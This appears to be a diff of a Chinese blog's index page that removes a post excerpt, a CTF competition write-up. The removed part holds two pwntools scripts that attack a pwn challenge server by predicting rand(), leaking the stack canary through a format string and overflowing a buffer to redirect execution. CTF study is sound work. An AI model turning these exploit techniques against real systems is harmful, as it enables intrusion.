@@ -131,12 +131,12 @@
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">9</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -189,102 +189,6 @@
 
           <div class="content index posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="fan fan">
-      <meta itemprop="description" content="我追逐的不是别人，而是我满怀期待的内心">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="fanfan's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">比赛记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-05-25 13:29:19 / 修改时间：15:50:17" itemprop="dateCreated datePublished" datetime="2023-05-25T13:29:19+08:00">2023-05-25</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="cc"><a href="#cc" class="headerlink" title="**cc"></a>**cc</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="三个愿望"><a href="#三个愿望" class="headerlink" title="三个愿望"></a>三个愿望</h3><p>这道题考点在于使用ctypes库通过libc(链接的函数库)模仿程序的随机数来交互，但后期发现这是伪随机数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&#x27;./makewishes&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#print(&#x27;pid=&#x27;+str(proc.pidof(r)))</span></span><br><span class="line">r=remote(<span class="string">&quot;59.110.164.72&quot;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载链接库</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;wish\n&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">22</span>)</span><br><span class="line">num=<span class="built_in">str</span>(libc.rand() % <span class="number">9</span> + <span class="number">1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;number!\n&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#canary</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;wish!\n&quot;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pwn</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;number!\n&quot;</span>,num)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x4011f5</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;wish!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>因为是伪随机数，用下面的也可以</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io= remote(<span class="string">&#x27;59.110.164.72&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./makewishes&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./makewishes&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;wish\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">22</span><span class="comment">#覆盖seed为零 </span></span><br><span class="line"><span class="comment">#payload= b&#x27;a&#x27;*6+b&#x27;\x00&#x27;*7+b&#x27;1&#x27;+p64(0)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a number!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;wish!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;number!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;make your final wish!\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(canary)+p64(<span class="number">0</span>)+p64(<span class="number">0x4011D6</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>同样两种方法</p>
-<p><strong>第一种</strong></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/05/25/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
       
   
   
@@ -1203,14 +1107,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
